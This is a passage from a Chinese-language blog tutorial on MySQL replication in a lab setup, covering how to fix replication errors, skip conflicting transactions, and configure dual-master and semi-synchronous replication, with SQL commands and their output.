class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs sql">##先看错误现象，SQL_RUNNING为<span class="hljs-keyword">NO</span>，让看看错误日志<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> slave status \G;<br><br>Seconds_Behind_Master: <span class="hljs-number">21</span><br>Slave_SQL_Running: <span class="hljs-keyword">No</span><br>Last_Error: Coordinator stopped because there were error(s) <span class="hljs-keyword">in</span> the worker(s). The most recent failure being: Worker <span class="hljs-number">1</span> failed executing transaction <span class="hljs-string">&#x27;ANONYMOUS&#x27;</span> <span class="hljs-keyword">at</span> master log rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000023</span>, end_log_pos <span class="hljs-number">444.</span> <br>See error log <span class="hljs-keyword">and</span><span class="hljs-operator">/</span><span class="hljs-keyword">or</span> performance_schema.replication_applier_status_by_worker <span class="hljs-keyword">table</span> <span class="hljs-keyword">for</span> more details about this failure <span class="hljs-keyword">or</span> others, if any.<br><br>##查看错误日志，好像是表的什么问题，再看下一个表<br>tail <span class="hljs-operator">-</span>f mysql.log<br><span class="hljs-number">2022</span><span class="hljs-number">-09</span><span class="hljs-number">-11</span>T03:<span class="hljs-number">34</span>:<span class="hljs-number">59.334704</span>Z <span class="hljs-number">23</span> [ERROR] [MY<span class="hljs-number">-013146</span>] [Repl] Slave <span class="hljs-keyword">SQL</span> <span class="hljs-keyword">for</span> channel <span class="hljs-string">&#x27;&#x27;</span>: Worker <span class="hljs-number">1</span> failed executing transaction <span class="hljs-string">&#x27;ANONYMOUS&#x27;</span> <span class="hljs-keyword">at</span> master log rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000022</span>, end_log_pos <span class="hljs-number">60979827</span>; <span class="hljs-keyword">Column</span> <span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">table</span> <span class="hljs-string">&#x27;hellodb.testlog&#x27;</span> cannot be converted <span class="hljs-keyword">from</span> type <span class="hljs-string">&#x27;char(30(bytes))&#x27;</span> <span class="hljs-keyword">to</span> type <span class="hljs-string">&#x27;char(40(bytes) utf8mb4)&#x27;</span>, Error_code: MY<span class="hljs-number">-013146</span><br><br>##查出原因了，这个testlog表已经存在了，不能往里面写数据，在同步前，新的数据<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> performance_schema.replication_applier_status_by_worker\G;<br><br>LAST_ERROR_MESSAGE: Worker <span class="hljs-number">1</span> failed executing transaction <span class="hljs-string">&#x27;ANONYMOUS&#x27;</span> <span class="hljs-keyword">at</span> master log rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000023</span>, end_log_pos <span class="hljs-number">444</span>; <br>Error <span class="hljs-string">&#x27;Table &#x27;</span>testlog<span class="hljs-string">&#x27; already exists&#x27;</span> <span class="hljs-keyword">on</span> query. <span class="hljs-keyword">Default</span> database: <span class="hljs-string">&#x27;hellodb&#x27;</span>. Query: <span class="hljs-string">&#x27;create table testlog (id int auto_increment primary key,name char(30),salary int default 20) character set utf8mb4&#x27;</span><br><br>##删除掉表，停止slave，启动slave，修改MASTER信息<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> testlog;<br>stop slave<br><br>##从手动修改Pos,执行<br>CHANGE MASTER <span class="hljs-keyword">TO</span><br>MASTER_HOST<span class="hljs-operator">=</span><span class="hljs-string">&#x27;10.0.0.132&#x27;</span>,<br>MASTER_USER<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sync&#x27;</span>,<br>MASTER_PASSWORD<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123&#x27;</span>,<br>MASTER_PORT<span class="hljs-operator">=</span><span class="hljs-number">3306</span>,<br>MASTER_LOG_FILE<span class="hljs-operator">=</span><span class="hljs-string">&#x27;rocky-bin.000024&#x27;</span>, MASTER_LOG_POS<span class="hljs-operator">=</span><span class="hljs-number">157</span>;<br><br><span class="hljs-keyword">start</span> slave<br><br>##再次执行存储过程，在源端加点东西，先创建表<br>use hellodb;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> testlog (id <span class="hljs-type">int</span> auto_increment <span class="hljs-keyword">primary</span> key,name <span class="hljs-type">char</span>(<span class="hljs-number">30</span>),salary <span class="hljs-type">int</span> <span class="hljs-keyword">default</span> <span class="hljs-number">20</span>) <span class="hljs-type">character</span> <span class="hljs-keyword">set</span> utf8mb4;<br><br>delimiter $$<br><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">procedure</span> sp_testlog() <br><span class="hljs-keyword">begin</span>  <br><span class="hljs-keyword">declare</span> i <span class="hljs-type">int</span>;<br><span class="hljs-keyword">set</span> i <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; <br>while i <span class="hljs-operator">&lt;=</span> <span class="hljs-number">100000</span> <br>do  <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> testlog(name,salary) <span class="hljs-keyword">values</span> (concat(<span class="hljs-string">&#x27;wang&#x27;</span>,<span class="hljs-built_in">FLOOR</span>(RAND() <span class="hljs-operator">*</span> <span class="hljs-number">100000</span>)),<span class="hljs-built_in">FLOOR</span>(RAND() <span class="hljs-operator">*</span> <span class="hljs-number">1000000</span>)); <br><span class="hljs-keyword">set</span> i <span class="hljs-operator">=</span> i <span class="hljs-operator">+</span><span class="hljs-number">1</span>; <br><span class="hljs-keyword">end</span> while; <br><span class="hljs-keyword">end</span>$$<br><br>delimiter ;<br><br>source <span class="hljs-operator">/</span>root<span class="hljs-operator">/</span>testlog.sql<br><span class="hljs-keyword">call</span> sp_testlog();<br><br>##从节点有<span class="hljs-number">21</span>s的复制同步延迟，已经优化很多了<br><span class="hljs-keyword">show</span> slave status \G;<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> testlog;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><span class="hljs-operator">|</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><span class="hljs-operator">|</span>    <span class="hljs-number">36626</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><br>Seconds_Behind_Master: <span class="hljs-number">21</span><br><br>##完成执行存储过程的同步<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> testlog;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><span class="hljs-operator">|</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">100000</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+</span><br><br><span class="hljs-keyword">show</span> processlist;<br><span class="hljs-number">49</span> <span class="hljs-operator">|</span> sync            <span class="hljs-operator">|</span> <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.128</span>:<span class="hljs-number">60752</span> <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> Binlog Dump <span class="hljs-operator">|</span>  <span class="hljs-number">1475</span> <span class="hljs-operator">|</span> Source has sent <span class="hljs-keyword">all</span> binlog <span class="hljs-keyword">to</span> replica; waiting <span class="hljs-keyword">for</span> more updates <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span><br>wait <span class="hljs-keyword">for</span> events<br><br>ss <span class="hljs-operator">-</span>nt：查看已经建立的TCP连接，ESTABLISHED，<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.128</span>:业务端口已建立<br></code></pre></td></tr></table></figure><p><img src="2792175-20220925210230296-1053595862.png" alt="image-20220911150305670"></p><p><img src="2792175-20220925210230590-751267323.png" alt="image-20220911150429302"></p><h2 id="7-同步堵塞-blocked-，序号冲突，跳过错误"><a href="#7-同步堵塞-blocked-，序号冲突，跳过错误" class="headerlink" title="7.同步堵塞(blocked)，序号冲突，跳过错误"></a>7.同步堵塞(blocked)，序号冲突，跳过错误</h2><p>跳过指定事件，跳过错误数量</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%sql_slave_skip_counter%&#x27;</span>;<br><br>##跳过N个错误<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> sql_slave_skip_counter<span class="hljs-operator">=</span>N<br></code></pre></td></tr></table></figure><p>有时候，从节点没有设置为read-only只读，然后在从节点新增了记录，比如id=9，而主节点又新增记录，序号也为9，那么这个9和从节点的9就不是同一个问题，导致冲突，造成复制堵塞(blocked)，entity的记录冲突了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> slave status \G;<br>Slave_IO_Running: Yes<br>Slave_SQL_Running: Yes<br><br>##从节点写入一条记录，<span class="hljs-number">8</span>号记录<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> teachers(name,age,gender) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;tea&#x27;</span>,<span class="hljs-number">11</span>,<span class="hljs-string">&#x27;M&#x27;</span>); <br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">where</span> tid<span class="hljs-operator">=</span><span class="hljs-number">8</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+------+-----+--------+</span><br><span class="hljs-operator">|</span> TID <span class="hljs-operator">|</span> Name <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+------+-----+--------+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">8</span> <span class="hljs-operator">|</span> tea  <span class="hljs-operator">|</span>  <span class="hljs-number">11</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+------+-----+--------+</span><br><br>##主节点插入一条记录<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> teachers(name,age,gender) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;teach&#x27;</span>,<span class="hljs-number">20</span>,<span class="hljs-string">&#x27;M&#x27;</span>); <br><br>##两边的tid<span class="hljs-number">-8</span>的记录不一样了，查看一下错误<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span> TID <span class="hljs-operator">|</span> Name          <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Song Jiang    <span class="hljs-operator">|</span>  <span class="hljs-number">45</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">2</span> <span class="hljs-operator">|</span> Zhang Sanfeng <span class="hljs-operator">|</span>  <span class="hljs-number">94</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">3</span> <span class="hljs-operator">|</span> Miejue Shitai <span class="hljs-operator">|</span>  <span class="hljs-number">77</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">4</span> <span class="hljs-operator">|</span> Lin Chaoying  <span class="hljs-operator">|</span>  <span class="hljs-number">93</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">5</span> <span class="hljs-operator">|</span> catyer        <span class="hljs-operator">|</span>  <span class="hljs-number">16</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">7</span> <span class="hljs-operator">|</span> teach         <span class="hljs-operator">|</span>  <span class="hljs-number">20</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">8</span> <span class="hljs-operator">|</span> teach         <span class="hljs-operator">|</span>  <span class="hljs-number">22</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-number">7</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span> TID <span class="hljs-operator">|</span> Name          <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">1</span> <span class="hljs-operator">|</span> Song Jiang    <span class="hljs-operator">|</span>  <span class="hljs-number">45</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">2</span> <span class="hljs-operator">|</span> Zhang Sanfeng <span class="hljs-operator">|</span>  <span class="hljs-number">94</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">3</span> <span class="hljs-operator">|</span> Miejue Shitai <span class="hljs-operator">|</span>  <span class="hljs-number">77</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">4</span> <span class="hljs-operator">|</span> Lin Chaoying  <span class="hljs-operator">|</span>  <span class="hljs-number">93</span> <span class="hljs-operator">|</span> F      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">5</span> <span class="hljs-operator">|</span> catyer        <span class="hljs-operator">|</span>  <span class="hljs-number">16</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">7</span> <span class="hljs-operator">|</span> uuu           <span class="hljs-operator">|</span>  <span class="hljs-number">11</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">8</span> <span class="hljs-operator">|</span> tea           <span class="hljs-operator">|</span>  <span class="hljs-number">11</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+---------------+-----+--------+</span><br><span class="hljs-number">7</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>##查出是entity <span class="hljs-number">7</span>序号<span class="hljs-number">7</span>直接堵塞掉了，第七条出问题，导致后面的记录都无法复制过去了<br>##其实是<span class="hljs-number">7</span>号和<span class="hljs-number">8</span>号都冲突了，需要跳过两个错误<br><span class="hljs-keyword">show</span> slave status \G;<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> performance_schema.replication_applier_status_by_worker\G;<br><br>LAST_ERROR_MESSAGE: Worker <span class="hljs-number">1</span> failed executing transaction <span class="hljs-string">&#x27;ANONYMOUS&#x27;</span> <span class="hljs-keyword">at</span> master log rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000024</span>, end_log_pos <span class="hljs-number">30689864</span>; Could <span class="hljs-keyword">not</span> <span class="hljs-keyword">execute</span> Write_rows event <span class="hljs-keyword">on</span> <span class="hljs-keyword">table</span> hellodb.teachers; <br>Duplicate entry <span class="hljs-string">&#x27;7&#x27;</span> <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;teachers.PRIMARY&#x27;</span>, Error_code: <span class="hljs-number">1062</span>; handler error HA_ERR_FOUND_DUPP_KEY; the event<span class="hljs-string">&#x27;s master log rocky-bin.000024, end_log_pos 30689864</span><br></code></pre></td></tr></table></figure><p>临时解决方案：跳过这个错误</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql">stop slave;<br>##跳过<span class="hljs-number">2</span>个错误<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> sql_slave_skip_counter<span class="hljs-operator">=</span><span class="hljs-number">2</span>;<br><span class="hljs-keyword">select</span> @<span class="hljs-variable">@sql</span>_slave_skip_counter;<br><br><span class="hljs-keyword">start</span> slave;<br><span class="hljs-keyword">show</span> slave status \G;<br>Slave_IO_Running: Yes<br>Slave_SQL_Running: Yes<br><br>##主节点插入，有了<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> teachers(name,age,gender) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;teach9&#x27;</span>,<span class="hljs-number">20</span>,<span class="hljs-string">&#x27;M&#x27;</span>);<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">where</span> tid<span class="hljs-operator">=</span><span class="hljs-number">9</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----+--------+-----+--------+</span><br><span class="hljs-operator">|</span> TID <span class="hljs-operator">|</span> Name   <span class="hljs-operator">|</span> Age <span class="hljs-operator">|</span> Gender <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+--------+-----+--------+</span><br><span class="hljs-operator">|</span>   <span class="hljs-number">9</span> <span class="hljs-operator">|</span> teach9 <span class="hljs-operator">|</span>  <span class="hljs-number">20</span> <span class="hljs-operator">|</span> M      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----+--------+-----+--------+</span><br><br>##错误解决办法，手动改，多行记录的话，手动改多行记录就行<br><span class="hljs-keyword">update</span> xxx <span class="hljs-keyword">set</span> <span class="hljs-keyword">where</span><br></code></pre></td></tr></table></figure><h1 id="双主架构实现：互为主节点"><a href="#双主架构实现：互为主节点" class="headerlink" title="双主架构实现：互为主节点"></a>双主架构实现：互为主节点</h1><p>将主节点也执行change master，使其变为从节点的从节点，容易造成数据冲突，不建议使用，双向同步，假如说用户无意间写到两个不同的主，而不是一份数据双写</p><p>最好还是写一份数据，安全，不会冲突</p><p>环境：主master 10.0.0.132，从slave 10.0.0.128，现在132也是128的从</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span>从节点上查看MySQL的binlog，记录binlog日志pos<br><span class="hljs-keyword">show</span> master status;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br><span class="hljs-operator">|</span> File             <span class="hljs-operator">|</span> Position <span class="hljs-operator">|</span> Binlog_Do_DB <span class="hljs-operator">|</span> Binlog_Ignore_DB <span class="hljs-operator">|</span> Executed_Gtid_Set <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br><span class="hljs-operator">|</span> slave<span class="hljs-operator">-</span>bin<span class="hljs-number">.000004</span> <span class="hljs-operator">|</span>      <span class="hljs-number">157</span> <span class="hljs-operator">|</span>              <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>                   <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br><br><span class="hljs-number">2.</span>修改change master<br><br>CHANGE MASTER <span class="hljs-keyword">TO</span><br>MASTER_HOST<span class="hljs-operator">=</span><span class="hljs-string">&#x27;10.0.0.128&#x27;</span>,<br>MASTER_USER<span class="hljs-operator">=</span><span class="hljs-string">&#x27;sync&#x27;</span>,<br>MASTER_PASSWORD<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123&#x27;</span>,<br>MASTER_PORT<span class="hljs-operator">=</span><span class="hljs-number">3306</span>,<br>MASTER_LOG_FILE<span class="hljs-operator">=</span><span class="hljs-string">&#x27;slave-bin.000004&#x27;</span>, MASTER_LOG_POS<span class="hljs-operator">=</span><span class="hljs-number">157</span>;<br><br>##启动slave<br><span class="hljs-keyword">start</span> slave<br>##重置<br>reset slave <span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure><h1 id="半同步机制-重点-：同步到一个从或者超过延迟时间就返回成功，加快事务的返回—-gt-用于主从-主备架构"><a href="#半同步机制-重点-：同步到一个从或者超过延迟时间就返回成功，加快事务的返回—-gt-用于主从-主备架构" class="headerlink" title="半同步机制(重点)：同步到一个从或者超过延迟时间就返回成功，加快事务的返回—&gt;用于主从(主备架构)"></a>半同步机制(重点)：同步到一个从或者超过延迟时间就返回成功，加快事务的返回—&gt;用于主从(主备架构)</h1><p><img src="2792175-20220925210230912-593743368.png" alt="image-20220912090735326"></p><p>异步复制的优点：返回结果快，写入到主库了后就返回写入成功了，SQL query set</p><p>异步复制的缺陷：如果在同步的过程中，master dump thread挂了，则无法同步，从节点的数据也不是最新的；而且在slave库还需要完成SQL thread写入到磁盘，这段如果没完成也是导致数据不是最新的情况</p><p>半同步机制：加入了检查从库是否数据落盘的插件，只有主库—从库，从库的事务commit后，写入磁盘了，主库这边才返回写入成功；或者是超过了同步延时时间，也会返回写成功</p><p>基本过程（增强型半同步复制）：优点，先检查是否同步，解决了主库返回成功后，访问从库（可能是只读库）没有数据，没同步到位的问题</p><p>1.用户提交事务（DML），执行SQL语句；客户端可能是本地socket，也可能是远端用户</p><p>2.写二进制日志</p><p>3.先等slave dump完成复制到slave</p><p>4.提交事务，写入磁盘</p><p>5.返回写成功</p><p><img src="2792175-20220925210235492-2031624148.png" alt="image-20220912101231408"></p><h2 id="模拟环境搭建一主两从：rpl-semi-sync-master-enabled"><a href="#模拟环境搭建一主两从：rpl-semi-sync-master-enabled" class="headerlink" title="模拟环境搭建一主两从：rpl_semi_sync_master_enabled"></a>模拟环境搭建一主两从：rpl_semi_sync_master_enabled</h2><p>主：132 ，从1：128，从2：131</p><p>插件：rpl_semi_sync_master_enabled，show plugins</p><h3 id="1-同步主从数据，开启slave"><a href="#1-同步主从数据，开启slave" class="headerlink" title="1.同步主从数据，开启slave"></a>1.同步主从数据，开启slave</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs sql">##Master节点操作配置<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%rpl_semi_sync_master_enabled%&#x27;</span>;<br><br>vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>rpl_semi_sync_master_enabled<span class="hljs-operator">=</span><span class="hljs-keyword">on</span><br>rpl_semi_sync_master_timeout<span class="hljs-operator">=</span><br><br>##查看系统自带的插件，安装插件<br><span class="hljs-number">1.</span>binlog、密码插件认证、守护进程，存储引擎等<br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> plugins;<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------+----------+--------------------+---------+---------+</span><br><span class="hljs-operator">|</span> Name                            <span class="hljs-operator">|</span> Status   <span class="hljs-operator">|</span> Type               <span class="hljs-operator">|</span> Library <span class="hljs-operator">|</span> License <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------------------------+----------+--------------------+---------+---------+</span><br><span class="hljs-operator">|</span> binlog                          <span class="hljs-operator">|</span> ACTIVE   <span class="hljs-operator">|</span> STORAGE ENGINE     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> GPL     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> mysql_native_password           <span class="hljs-operator">|</span> ACTIVE   <span class="hljs-operator">|</span> AUTHENTICATION     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> GPL     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> sha256_password                 <span class="hljs-operator">|</span> ACTIVE   <span class="hljs-operator">|</span> AUTHENTICATION     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> GPL     <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> caching_sha2_password           <span class="hljs-operator">|</span> ACTIVE  